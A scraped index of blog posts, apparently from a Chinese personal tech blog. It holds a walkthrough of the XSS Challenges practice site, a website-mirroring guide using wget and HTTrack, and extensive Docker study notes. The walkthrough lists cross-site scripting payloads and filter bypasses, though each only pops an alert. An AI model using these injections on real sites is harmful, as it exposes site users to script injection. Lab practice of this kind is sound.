(int21h.jp)\n审查元素，发现搜索框的长度被限制，修改maxlength的值即可。\n\u0026#34;\u0026gt;\u0026lt;sCript\u0026gt;alert(document.domain);\u0026lt;/Script\u0026gt; Stage #6  Hint: Event handler attributes.\n 地址：XSS Challenges (by yamagata21) - Stage #6 (int21h.jp)\n输入测试语句：\n\u0026#34;\u0026gt;\u0026lt;sCript\u0026gt;alert(document.domain);\u0026lt;/Script\u0026gt; 发现尖括号和斜杠被转义了，那我们就使用不带尖括号的语句。\n\u0026#39;\u0026#34; onm=\u0026#34;alert(document.domain);\u0026#34;\u0026#39; Stage #7  Hint:Nearly the same\u0026hellip; but a bit more tricky.\n 地址：XSS Challenges (by yamagata21) - Stage #7 (int21h.jp)\n审查元素，发现Hint元素旁边有一个隐藏的输入框，将其属性修改为text，并将value设置如下：\n‘”onmouseover=\u0026#34;alert(document.domain);\u0026#34;\u0026#39; Stage #8  Hint:the \u0026lsquo;javascript\u0026rsquo; scheme.\n 地址：XSS Challenges (by yamagata21) - Stage #8 (int21h.jp)\n测试一下：\n\u0026quot;\u0026gt;\u0026lt;ScrIpt\u0026gt;alert(document.domain)\u0026lt;/ScrIpt\u0026gt;\r语句传到了下面的跳转链接：\n\u0026lt;a href=\u0026quot;\u0026amp;quot;\u0026gt;\u0026lt;ScrIpt\u0026gt;alert(document.domain)\u0026lt;/ScrIpt\u0026gt;\u0026quot; class=\u0026quot;link-instanted\u0026quot;\u0026gt;\u0026quot;\u0026amp;gt;\u0026amp;lt;ScrIpt\u0026amp;gt;alert(document.domain)\u0026amp;lt;/ScrIpt\u0026amp;gt;\u0026lt;/a\u0026gt;\r根据提示考虑通过javascript:伪协议方式构造XSS：\njavascript:alert(document.domain)\rStage #9  Hint:UTF-7 XSS\n 地址：XSS Challenges (by yamagata21) - Stage #9 (int21h.jp)\n若在Content-Type中未设置charset，在meta标签中也未设置字符集，就能通过字符集抢占的方式使浏览器以UTF-7格式解析。\nUTF-7在线编码:Novel Tools - UTF-7 Text Encoder\n再通过控制台将name=charset的值设为utf-7即可。\nStage #10  Hint:s/domain//g;\n 地址：XSS Challenges (by yamagata21) - Stage #10 (int21h.jp)\n测试：\n\u0026quot;\u0026gt;\u0026lt;sCripT\u0026gt;alert(document.domain)\u0026lt;sCripT\u0026gt;\r发现domain被过滤，尝试双写：\n\u0026quot;\u0026gt;\u0026lt;sCripT\u0026gt;alert(document.domdomainain)\u0026lt;sCripT\u0026gt;\rStage #11  Hint:\n URL错误，暂时访问不到。\nStage #12  Hint:\u0026ldquo;s/[\\x00-\\x20\u0026lt;\u0026gt;\u0026quot;']//g;\u0026rdquo;\n IE下使用如下语句：\n`onmouseover=alert(document.domain);\r 本文链接：XSS Challenges | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/xss-challenges/","summary":"题目地址：https://xss-quiz.int21h.jp/\nStage #1  Hint: Very simple\u0026hellip;\n 直接输入测试语句：\n\u0026lt;sCript\u0026gt;alert(document.domain);\u0026lt;/Script\u0026gt; Stage #2  Hint: Close the current tag and add SCRIPT tag\u0026hellip;\n 地址：XSS Challenges (by yamagata21) - Stage #2 (int21h.jp)\n上测试语句：\n\u0026lt;sCript\u0026gt;alert(document.domain);\u0026lt;/Script\u0026gt; 然后审查元素，只需要把input标签闭合就能执行我们的语句了。\n\u0026#34;\u0026gt;\u0026lt;sCript\u0026gt;alert(document.domain);\u0026lt;/Script\u0026gt; Stage #3  Hint: The input in text box is properly escaped.\n 地址：XSS Challenges (by yamagata21) - Stage #3 (int21h.jp)\n这个页面有两个input标签，先在搜索框输入我们的测试语句试试。\n直接把我们的语句放到\u0026lt;b\u0026gt;标签里了，但是这旁边不是还有一个input标签吗。把两者的name互换一下即可。\nStage #4  Hint: Invisible input field.\n 地址：XSS Challenges (by yamagata21) - Stage #4 (int21h.","title":"XSS Challenges"},{"content":"He11o, th1s 1s a test!\n#include \u0026lt;stdio.h\u0026gt;int main() { pritnf(\u0026#34;Hello World!\u0026#34;); }  本文链接:Test | Atmet (oopsdc.tk)\n文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/test/","summary":"He11o, th1s 1s a test!\n#include \u0026lt;stdio.h\u0026gt;int main() { pritnf(\u0026#34;Hello World!\u0026#34;); }  本文链接:Test | Atmet (oopsdc.tk)\n文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","title":"Test"},{"content":"使用wget克隆网站 使用方法 我们可以使用man wget命令查看帮助文档。\n操作命令及参数解释如下：\nwget -m -p -E -k -K -np -v https://www.baidu.com/ # 参数解释 -m\t:\t镜像，选择该选项适用于Web站点 -p\t:\t页面获取的先决条件，该选项确保包含了请求的图片和css脚本文件被下载(可以更好复制html5站点) -E\t:\t适用于拓展，可以在本地另存一个html文件 -k\t:\t转换链接，确保文件本转换，适用于本地浏览 -K\t:\t转换备份文件，将以orig为后缀作为原始文件 -np\t:\t不要到上一层子目录中 -v\t:\t显示过程，不显示过程为-nv 克隆结果 # 克隆后在当前目录下会出现一个与网站同名的子目录，树形结构如下 www.baidu.com ├── index.html ├── index.html.orig └── robots.txt 0 directories, 3 files 使用HTTrack克隆网站 使用方法 httrack # 进入软件后需要输入项目名 baidu # 克隆后的存放地址 /home/oopsdc/Desktop # 要克隆的网站地址 www.baidu.com # 有6个选项，此处我们选2，具有向导递归层级的镜像网站 2 # 接下来的部分全选默认选项 默认回车 克隆结果 baidu ├── backblue.gif ├── cookies.txt ├── fade.gif ├── hts-cache [error opening dir] ├── hts-log.txt ├── index.html └── www.baidu.com ├── index.html ├── s2d49.html ├── s2f7f.html ├── s412d.html ├── s5084.html ├── s5e09.html ├── s6fa8.html └── sa132.html 2 directories, 13 files  本文链接：网站镜像克隆 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/%E7%BD%91%E7%AB%99%E9%95%9C%E5%83%8F%E5%85%8B%E9%9A%86/","summary":"使用wget克隆网站 使用方法 我们可以使用man wget命令查看帮助文档。\n操作命令及参数解释如下：\nwget -m -p -E -k -K -np -v https://www.baidu.com/ # 参数解释 -m\t:\t镜像，选择该选项适用于Web站点 -p\t:\t页面获取的先决条件，该选项确保包含了请求的图片和css脚本文件被下载(可以更好复制html5站点) -E\t:\t适用于拓展，可以在本地另存一个html文件 -k\t:\t转换链接，确保文件本转换，适用于本地浏览 -K\t:\t转换备份文件，将以orig为后缀作为原始文件 -np\t:\t不要到上一层子目录中 -v\t:\t显示过程，不显示过程为-nv 克隆结果 # 克隆后在当前目录下会出现一个与网站同名的子目录，树形结构如下 www.baidu.com ├── index.html ├── index.html.orig └── robots.txt 0 directories, 3 files 使用HTTrack克隆网站 使用方法 httrack # 进入软件后需要输入项目名 baidu # 克隆后的存放地址 /home/oopsdc/Desktop # 要克隆的网站地址 www.baidu.com # 有6个选项，此处我们选2，具有向导递归层级的镜像网站 2 # 接下来的部分全选默认选项 默认回车 克隆结果 baidu ├── backblue.","title":"网站镜像克隆"},{"content":"Docker概述 镜像（image）：\n一个只读模板。一个镜像可以用来创建多个Docker容器，好似Java中的类和对象，镜像是类，容器是对象。\r容器（container）：\nDocker利用容器独立运行一个或一组应用，容器是用镜像创建的运行实例。\r容器可以被启动、开始、停止、删除。\r每个容器都是相互个隔离的。\r也可以把容器看做一个简易版Linux环境(包括root用户权限、进程空间、用户空间和网络空间等)及运行在其中的应用程序。\r容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器最上面一层可读可写。\r仓库（repository）：\n仓库是集中存放镜像文件的场所。\r仓库和仓库注册服务器(registry)是有区别的，后者往往存在多个仓库，每个仓库又存在多个镜像，每个镜像有不同的标签。\r仓库分为公开仓库和私有仓库两种形式。\r最大的公开仓库是Docker Hub，国内最大的为阿里云、网易云等。\rDocker安装  环境:CentOS 7\n 1.官方文档\n2.yum安装gcc相关环境：\nyum -y install gcc yum -y install gcc-c++ 3.卸载旧版本：\nyum remove docker \\ \tdocker-client \\ \tdocker-client-latest \\ \tdocker-common \\ \tdocker-latest \\ \tdocker-latest-logrotate \\ \tdocker-logrotate \\ \tdocker-engine 4.安装依赖包：\nyum install -y yum-utils 5.设置镜像仓库：\n# 错误 yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo ## 报错 [Errno 14] curl#35 - TCP connection reset by peer [Errno 12] curl#35 - Timeout # 推荐国内镜像 yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 6.更新yum软件包索引：\nyum makecache fast 7.安装Docker CE：\nyum install docker-ce docker-ce-cli containerd.io 8.启动Docker：\nsystemctl start docker 9.测试命令：\ndocker version # 查看Docker版本 docker run hello-world # 拉取镜像 docker images # 查看本地镜像 Docker卸载 systemctl stop docker yum -y remove docker-ce docker-ce-cli containerd.io rm -rf /var/lib/docker Docker换源 # 创建或修改/etc/docker/daemon.json文件 vim /etc/docker/daemon.json { \u0026#34;registry-mirrors\u0026#34;: [\u0026#34;https://registry.docker-cn.com\u0026#34;] } systemctl daemon-reload systemctl restart docker.service # 网易 http://hub-mirror.c.163.com # ustc https://docker.mirrors.ustc.edu.cn # 中国科技大学 https://docker.mirrors.ustc.edu.cn # 阿里云容器 服务 https://cr.console.aliyun.com/ # 首页点击“创建我的容器镜像” 得到一个专属的镜像加速地址，类似于“https://1234abcd.mirror.aliyuncs.com” nginx安装 tomcat安装 部署es+kibana # es暴露的端口很多，十分耗内存，数据一般需要放置到安全目录 # 启动es docker run -d --name elasticsearch --net somenetwork -p 9200:9200 -p 9300:9300 -e \u0026#34;discovery.type=single-node\u0026#34; elasticsearch:latest # --net somenetwork 网络配置 # 查看CPU状态 docker stats # 运行环境修改 docker run -d --name elasticsearch --net somenetwork -p 9200:9200 -p 9300:9300 -e \u0026#34;discovery.type=single-node\u0026#34; -e ES_JAVA_OPTS=\u0026#34;-Xms64m -Xmx512m\u0026#34; elasticsearch:latest Portainer安装 Docker图形化管理工具，提供一个后台面板：\ndocker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer Rancher(CI/CD使用)\nDocker镜像讲解 镜像是什么 镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。\n所有应用直接打包Docker镜像。\n如何得到镜像：\n 官方下载 朋友分享 自己制作  Docker镜像加载原理  UnionFS(联合文件系统)\n 我们下载的时候看见的一层层就是这个。\n是一种分层、轻量级且高性能的文件系统，支持对文件系统的修改作为一次提交来层层叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directions into a single virtual filesystem)。Union文件系统是Docker镜像的基础，镜像可以通过分层来进行继承，基于基础镜像(没有父镜像)，可以制作各种具体的应用镜像。\n特性：一次同时加载多个文件系统，但从外面只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。\n Docker镜像加载原理\n Docker的镜像实际上由一层层文件系统组成，这种层级的文件系统称为UnionFS。\nbootfs(boot file system)主要包含bootloader和kernel，bootloader主要引导加载kernel，Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统一样，包含boot加载器和内核。boot加载完成后整个内核都在内存中，此时内存的使用权已转交给内核，此时系统也会卸载bootfs。\nrootfs，在bootfs之上。包含的就是典型Linux系统中的/dev，/proc，/bin，/etc等标准目录和文件。rootfs就是各种不同的操作系统发行版，如Ubuntu、CentOS等。\n对于一个精简的OS，rootfs可以很小，只需包含最基本的命令、工具和程序库即可，因为底层直接用Host的kernel，自己只需提供rootfs。可见对于不同的Linux发行版，bootfs基本一致，rootfs会有差别，因此不同的发行版可以公用bootfs。\n分层理解 为什么Docker镜像采用分层结构？\n资源共享，如有多个镜像都从相同的Base镜像构建而来，那么宿主机只需在磁盘上保留一份Base镜像，内存中也只需加载一份Base镜像，这样就可以为所有的容器服务了，且镜像的每一层都可以被共享。\n使用docker image inspect查看镜像分层。\n 特点\n Docker镜像一般都是只读的，当容器启动时，一个新的可写层被加载到镜像顶部。\n这一层就是我们常说的容器层，容器之下的都叫镜像层。\ncommit镜像 docker commit #提交容器成为一个新的版本 # 命令和git原理类似 docker commit -m=\u0026#34;description\u0026#34; -a=\u0026#34;author\u0026#34; id target_image_name:[TAG] 实战测试\ndocker run -it -p 8080:8080 tomcat # 将webapps.dist所有文件拷贝到webapps cp -r webapps.dist/* webapps # 将修改后的容器通过commit提交为一个新的镜像 docker commit -a=\u0026#34;dc\u0026#34; -m=\u0026#34;add webapps\u0026#34; id name:version 容器 容器就是通过docker镜像创建的实例对象，常用命令如下:\ndocker ps # 查看运行中的容器状态 docker ps -a # 查看所有容器状态 docker ps -aq # 列出所有容器ID docker stop $(docker ps -aq) # 停止所有容器 docker rm $(docker ps -aq) # 删除所有容器 docker rmi $(docker images -q) # 删除所有镜像 容器数据卷 什么是容器数据卷？ Docker的理念：将应用和环境打包成一个镜像。\n如果数据都在容器中，容器一删除则数据消失。\n需求：数据持久化。\n容器之间需要有一个数据共享技术。\nDocker容器中产生的数据同步到本地。\n这就是卷技术，目录挂载，将容器内目录挂载到虚拟机或Linux中。\n总结：容器的持久化和同步操作。容器间也可以数据共享。\n使用数据卷  使用命令挂载\n docker run -it -v 主机内目录:容器内目录 docker run -it -v /home/test_real:/home centos /bin/bash # 宿主机查看挂载状态 docker inspect container-id \u0026#34;Mounts\u0026#34;: [ { \u0026#34;Type\u0026#34;: \u0026#34;bind\u0026#34;, \u0026#34;Source\u0026#34;: \u0026#34;/home/test_real\u0026#34;, \u0026#34;Destination\u0026#34;: \u0026#34;/home\u0026#34;, \u0026#34;Mode\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;RW\u0026#34;: true, \u0026#34;Propagation\u0026#34;: \u0026#34;rprivate\u0026#34; } ] # 退出容器 exit # 修改文件内容 vim testfile # 重新打开容器 docker start container-id # 进入容器 docker attach container-id #未start报错:You cannot attach to a stopped container, start it first MySQL安装 思考：MySQL数据持久化问题。\n# 拉取MySQL docker pull mysql # 官方启动:docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag # 运行容器并做数据挂载 docker run -d -p 3310:3306 -v /home/mysql_real/conf:/etc/mysql/conf.d -v /home/mysql_real/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 mysql 具名和匿名挂载 # 匿名挂载 -v 容器内路径 docker run -d -P --name name -v /etc/nginx nginx # -P:随机映射端口 # 查看所有的volume情况 docker volume ls # 具名挂载 docker run -d -P --name name -v juming-nginx:/etc/nginx nginx 所有Docker容器内的卷，没有指定目录的情况下都在/var/lib/docker/volumes/xxx/_data。\n通过具名挂载可以方便的找到我们的一个卷，大多数情况使用具名挂载。\n# 如何确定匿名挂载还是具名挂载，还是指定路径挂载 -v 容器内路径 # 匿名挂载 -v 卷名:容器内路径 # 具名挂载 -v /宿主机路径:容器内路径 # 指定路径挂载 拓展：\n# 通过-v容器内路径:ro/rw改变读写权限 docker run -d -P --name name -v juming-nginx:/etc/nginx:ro nginx # 只能通过宿主机操作，容器内部无法操作 docker run -d -P --name name -v juming-nginx:/etc/nginx:rw nginx 初识Dockerfile Dockerfile就是用来构建Docker镜像的构建文件。其实就是命令脚本，通过这个脚本可以生成镜像。\n镜像是一层层的，脚本就是一个个的命令，每个命令就是一层。\n# 创建一个dockerfile文件 # 指令(大写) 参数 FROM centos VOLUME[\u0026#34;volume01\u0026#34;,\u0026#34;volume02\u0026#34;] # 匿名挂载，和外部一定有一个同步目录 CMD echo \u0026#34;-----end-----\u0026#34; CMD /bin/bash # 使用 docker build -f dockerfile1 -t dc/centos . # 查看容器本地卷信息，测试文件是否同步 docker inspect -f \u0026#34;{{.Monuts}}\u0026#34; id 这种方式使用十分多，因为我们通常会构建自己的镜像。\n假设构建镜像的时候没有挂载卷，要手动镜像挂载，-v 卷名:容器内路径。\n数据卷容器 多个MySQL实现数据共享。\ndocker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql docker run -d -p 3310:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from mysql01 mysql 容器之间配置信息的传递，数据卷容器的生命周期一直持续到无人使用为止。\n一旦持久化到了本地，这个时候本地数据不会删除。\nDockerFile 核心是用来构建Docker镜像的文件。是一个命令参数脚本。\n构建步骤：\n 编写一个Dockerfile文件 docker build构建成为一个镜像 docker run运行镜像 docker push发布镜像(DockerHub、阿里云镜像仓库)  DockerFile构建过程 基础知识：\n 每个保留关键字(指令)都必须为大写字母 执行顺序由上至下 #为注释 每个指令都会创建提交一个新镜像层并提交  DockerFile面向开发。\nDockerFile：构建文件，定义了一切的步骤，源代码。\nDockerImage：通过DockerFile构建生成的镜像，最终发布和运行的产品。\nDocker容器：镜像运行起来提供服务。\nDockerFile指令 实战centos部署 DockerHub大部分镜像都是由基础镜像scratch组成，然后配置需要的软件和配置。\n# 1.编写DockerFile文件 FROM centos MAINTAINER dc\u0026lt;1107762686@qq.com\u0026gt; ENV MYPATH /usr/local WORKDIR $MYPATH RUN yum -y install vim RUN yum -y install net-tools EXPOSE 80 CMD echo $MYPATH CMD echo \u0026#34;-----end-----\u0026#34; CMD /bin/bash # 2.通过文件构建镜像 docker build -f mydockerfile -t mycentos:1.0 . # 运行结果 Successfully built b8fab89ecdea Successfully tagged mycentos:1.0 # 3.测试运行 docker run -it mycentos:1.0 # 列出本地进行的变更历史 docker history image-id  CMD 和 ENTRYPOINT 的区别\n CMD\t# 指定容器启动时要运行的命令，只有最后一个生效，且可被替代 ENTRYPOINT\t# 同CMD，可以追加命令 测试CMD\n# 编写DockerFile文件 vim dockerfile-cmd-test FROM centos CMD [\u0026#34;ls\u0026#34;,\u0026#34;-a\u0026#34;] # 构建镜像 docker build -f dockerfile-cmd-test -t cmd-test . # RUN运行，发现`ls -a`命令生效 docker run `id` # 想追加一个命令 ls -al docker run `id` -l # error # cmd清理 -l 替换了CMD [\u0026#34;ls\u0026#34;,\u0026#34;-a\u0026#34;]命令，-l不是命令所以报错 测试ENTRYPOINT\n# 编写DockerFile文件 vim dockerfile-cmd-entrypoint FROM centos ENTRYPOINT [\u0026#34;ls\u0026#34;,\u0026#34;-a\u0026#34;] # 构建镜像 docker build -f dockerfile-cmd-entrypoint -t entrypoint-test . DockerFile中很多命令都相似，我们需要了解其中的区别，最好的学习就是对比并测试。\n实战tomcat部署  准备镜像文件，tomcat压缩包，jdk压缩包 编写DockerFile文件，官方命名Dockerfile，build会自动寻找这个文件，不需要-f指定：  FROM centos MAINTAINER dc\u0026lt;1107762686@qq.com\u0026gt; COPY readme.txt /usr/local/readme.txt ADD apache-tomcat-9.0.22.tar.gz /usr/local ADD jdk-8u281-linux-x64.tar.gz /usr/local RUN yum -y install vim ENV MYPATH /usr/local WORKDIR $MYPATH ENV JAVA_HOME /usr/local/jdk-8u281 ENV CLASS_PATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.22 ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.22 ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin EXPOSE 8080 CMD /usr/local/apache-tomcat-9.0.22/bin/startup.sh \u0026amp;\u0026amp; tail -F /usr/local/apache-tomcat-9.0.22/bin/logs/catalina.out 3.构建镜像：\ndocker build -t diy-tomcat . 4.启动镜像：\ndocker run -d -p 9090:8080 --name dc-tomcat -v /home/tomcat/test:/url/local/apache-tomcat-9.0.22/webapps/test -v /home/tomcat/tomcat-logs/:/usr/local/apache-tomcat-9.0.22/logs diy-tomcat 5.进入容器：\ndocker exec -it `随意复制一段id` /bin/bash 6.访问测试：\ncurl localhost:9090 7.发布项目(做了卷挂载，直接在本地发布即可)\nxml文件 jsp文件 项目部署成功。\n发布镜像  DockerHub\n 1.登录DockerHub：Docker Hub：\ndocker login -u username -p password 2.在服务器上提交镜像：\ndocker tag [image-id/image-name:tag] new-image-name:tag docker push image-id:tag/image-name:tag  aliyun镜像\n 1.登录阿里云：阿里云-上云就上阿里云 (aliyun.com)\n2.进入容器镜像服务:容器镜像服务_镜像构建_镜像授权_镜像托管-阿里云 (aliyun.com)\n3.创建命名空间\n4.创建容器镜像\n5.参考官方文档\nDocker网络 Docker0 问题：docker是如何处理容器网络访问的？\n我们首先创建一个tomcat容器，利用学到的两类方法来试试。\n 方式一，手动执行\n docker run -d -P --name tomcat-01 tomcat docker exec -it tomcat-01 ip addr  方式二，编写DockerFile\n # DockerFile内容 FROM tomcat MAINTAINER dc\u0026lt;1107762686@qq.com\u0026gt; CMD docker run -d -P --name tomcat-01 tomcat CMD docker exec -it tomcat-01 ip addr # 构建镜像 docker build -f dockerfile -t tomcat-test . 方法有误，稍后修改。\n容器启动的时候会得到一个docker分配的eth@if262ip地址。\n测试：Linux能ping通容器内部ip地址。\n 原理\n 每安装并启动一个Docker容器，Docker就会给其分配一个ip，只要安装了Docker，就会有一个docker0网卡。\ndocker0网卡使用桥接模式，使用veth-pair技术。\n再启动一个容器就会多一对网卡。\n7: veth4f1ae6f@if6 docker exec -it tomcat-02 ping `ip` #tomcat-02可以ping通tomcat-01 # 容器之间可以互通  小结\n Docker使用的是Linux的桥接，宿主机中是一个Docker容器的网桥。\nDocker中所有的网络接口都是虚拟的，转发效率高。\n容器删除，则对应的一对网桥也被回收。\n\u0026ndash;link  思考场景\n 编写了一个微服务，database url=ip:，项目不重启，数据库ip换掉，如何进行处理？\ndocker exec -it tomcat-02 ping tomcat-01 # 无法直接ping通 # 启动一个tomcat-03，并与tomcat-02连接 docker run -d -P --name tomcat-03 --link tomcat-02 tomcat # 实现通过名称ping通，但是反向无法ping通 # 其实就是tomcat-03在本地配置了tomcat-02 # 查看tomcat-03 hosts配置 docker exec -it tomcat-03 cat /etc/hosts --link就是在hosts配置中增加了一个映射，已经不建议使用。\ndocker0问题：不支持容器名进行连接访问。\n自定义网络 # 查看所有docker网络 docker network ls 网络模式\n# --net bridge 为默认参数 docker run -d -P --name tomcat-01 --net bridge tomcat # docker0特点：默认不能通过名称访问，通过 --link 打通连接 # 可以自定义一个网络 docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet # 查看网络概览 docker network ls # 查看详细信息 docker network inspect mynet # 使用自己的网络 docker run -d -P --name tomcat-mynet-01 --net mynet tomcat docker run -d -P --name tomcat-mynet-02 --net mynet tomcat # ping测试 docker exec -it tomcat-mynet-01 ping tomcat-mynet-02 # 两者互相可ping通 优点：\nredis、mysql：不同集群使用不同网络，保证集群是安全和健康的。\n网络连通 # 启动两个容器 docker run -d -P --name tomcat-01 tomcat docker run -d -P --name tomcat-02 tomcat # 已知tomcat-01与tomcat-02无法ping通 # 连接网络 docker network connect mynet tomcat-01 docker network connect mynet tomcat-02 # 查看 mynet docker network inspect mynet # 其中包含了tomcat-01与tomcat-02 # 四个容器完美ping通 实战Redis集群部署 # 使用脚本部署 docker network create redis --subnet 172.42.0.0/16 # 通过脚本创建六个redis配置 for port in $(seq 1 6); do mkdir -p /mydata/redis/node-${port}/conf touch /mydata/redis/node-${port}/conf/redis.conf cat \u0026lt;\u0026lt; EOF \u0026gt;/mydata/redis/node-${port}/conf/redis.conf port 6379 bind 0.0.0.0 cluster-enabled yes cluster-config-file nodes.conf cluster-node-timeout 5000 cluster-announce-ip 172.42.0.1${port} cluster-announce-port 6379 cluster-announce-bus-port 16379 appendonly yes EOF done docker run -p 637${port}:6379 -p 1637${port}:16379 --name redis-${port} -v /mydata/redis/node-${port}/data:/data -v /mydata/redis/node-${port}/conf/redis.conf:/etc/redis/redis.conf -d --net redis --ip 172.42.0.1${port} redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conf; # 1-6依次修改即可 docker run -p 6371:6379 -p 16371:16379 --name redis-1 \\ -v /mydata/redis/node-1/data:/data \\ -v /mydata/redis/node-1/conf/redis.conf:/etc/redis/redis.conf \\ -d --net redis --ip 172.42.0.11 redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conf # 进入容器 docker exec -it redis-1 /bin/sh # redis中为sh # 创建集群 redis-cli --cluster create 172.42.0.11:6379 172.42.0.12:6379 172.42.0.13:6379 172.42.0.14:6379 172.42.0.15:6379 172.42.0.16:6379 --cluster-replicas 1 # 查看集群数量 redis-cli -c cluster info cluster nodes set a b get a # 第一次get会提示`Could not connect to Redis at 172.42.0.13:6379: Host is unreachable` # 重新进入 redis-cli -c get a # `Redirected to slot [15495] located at 172.42.0.14:6379 \u0026#34;b\u0026#34;` cluster nodes `redis-3状态为master,fail，redis-4状态为myself,master` SpringBoot微服务打包Docker镜像  构建SpringBoot项目 打包应用 编写DockerFile 构建镜像 发布运行  # DockerFile FROM java:8 COPY *.jar /app.jar CMD [\u0026#34;--server.port=8080\u0026#34;] EXPOSE 8080 ENTRYPOINT [\u0026#34;java\u0026#34;,\u0026#34;-jar\u0026#34;,\u0026#34;/app.jar\u0026#34;] # 构建 docker build -t image-name . Docker Compose 概述 官方概述:Overview of Docker Compose | Docker Documentation\n轻松高效管理容器，定义运行多个容器。\n一键启动/停止服务。\n三步骤 1.Define your app\u0026rsquo;s environment with a Dockerfile so it can be reproduced anywhere.\n Dockerfile 保证我们的项目在任何地方可以运行  2.Define the services that make up your app in docker-compose.yml so they can be run together in an isolated environment.\n services 什么是服务 docker-compose.yml 文件应该怎么写  3.Run docker-compose up and Compose starts and runs your entire app.\n 启动项目  作用：批量容器编排\n 理解\n Compose 是 Docker 官方开源项目，需要安装。\nDockerfile让程序在任何地方运行。\nversion: \u0026#39;2.0\u0026#39; services: web: build: . ports: - \u0026#34;5000:5000\u0026#34; volumes: - .:/code - logvolume01:/var/log links: - redis redis: image: redis volumes: logvolume01: {} docker-compose up 100个服务\nCompose重要的两个概念：\n 服务 services，容器、应用(web、redis、mysql\u0026hellip;) 项目 project，一组关联容器  安装Docker Compose 官方安装文档:Install Docker Compose | Docker Documentation\n1.下载\n# 官方下载，从GitHub下载，巨慢 sudo curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.28.5/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose # 国内镜像 curl -L https://get.daocloud.io/docker/compose/releases/download/1.24.0/docker-compose-`uname -s`-`uname -m` \u0026gt; /usr/local/bin/docker-compose # 查看是否下载成功 cd /usr/local/bin ls 2.授权\nchmod +x /usr/local/bin/docker-compose # 或 chmod 777 /usr/local/bin/docker-compose # 任意位置运行 docerk-compose version 查看是否成功 初使用 使用教程：Get started with Docker Compose | Docker Documentation\n1.创建项目文件夹\n2.项目文件夹下创建app.py文件，将官网代码复制过来：\nimport time import redis from flask import Flask app = Flask(__name__) cache = redis.Redis(host=\u0026#39;redis\u0026#39;, port=6379) def get_hit_count(): retries = 5 while True: try: return cache.incr(\u0026#39;hits\u0026#39;) except redis.exceptions.ConnectionError as exc: if retries == 0: raise exc retries -= 1 time.sleep(0.5) @app.route(\u0026#39;/\u0026#39;) def hello(): count = get_hit_count() return \u0026#39;Hello World! I have been seen {}times.\\n\u0026#39;.format(count) 3.创建requirements.txt依赖包文件\n4.创建Dockerfile：\nFROM python:3.7-alpine\t# 基本环境包 WORKDIR /code\t# 工作目录 ENV FLASK_APP=app.py\t# 环境 ENV FLASK_RUN_HOST=0.0.0.0 RUN apk add --no-cache gcc musl-dev linux-headers\t# 运行 COPY requirements.txt requirements.txt\t# 拷贝文件 RUN pip install -r requirements.txt\t# 使用pip安装 EXPOSE 5000\t# 暴露端口 COPY . .\t# 拷贝当前目录 CMD [\u0026#34;flask\u0026#34;, \u0026#34;run\u0026#34;]\t# 运行 5.在Compose文件中定义服务：\n# 以前我们需要docker run逐个运行 # 现在创建docker-compose.yml文件 version: \u0026#34;3.9\u0026#34;\t# 版本 services:\t# 服务 web: build: . ports: - \u0026#34;5000:5000\u0026#34; redis: image: \u0026#34;redis:alpine\u0026#34; 6.使用Compose构建并运行应用：\ndocker-compose up # docker-compose up -d 后台运行 # 我这里报错了，报错如下： ERROR: Version in \u0026#34;./docker-compose.yml\u0026#34; is unsupported. You might be seeing this error because you\u0026#39;re using the wrong Compose file version. Either specify a supported version (e.g \u0026#34;2.2\u0026#34; or \u0026#34;3.3\u0026#34;) and place your service definitions under the `services` key, or omit the `version` key and place your service definitions at the root of the file to use version 1. For more on the Compose file format versions, see https://docs.docker.com/compose/compose-file/ # 解决方案，修改docker-compose.yml文件中的版本 version: \u0026#34;3.9\u0026#34; -\u0026gt; version: \u0026#34;3.3\u0026#34; # 项目部署过程中出现了其它错误 docker-compose build # 先build一下 docker-compose up # 成功启动 # 测试，每访问一次计数器+1 localhost:5000 # 浏览器键入 curl localhost:5000 # curl请求 7.停止：\n# 在yaml文件所在目录下运行命令 docker-compose stop Ctrl+C 流程：\n1.创建网络\n2.执行Docker-compose.yml\n3.启动服务\n默认规则：\n自动拉取镜像：\n[root@localhost ~]# docker service ls Error response from daemon: This node is not a swarm manager. Use \u0026#34;docker swarm init\u0026#34; or \u0026#34;docker swarm join\u0026#34; to connect this node to swarm and try again. **命名规则：**默认服务名 文件名_服务名_num。A B _num 副本数量。集群状态下不可能只有一个运行实例。弹性：10 HA 高可用、高并发。kunectl service负载均衡。\n**网络规则：**使用命令docker network 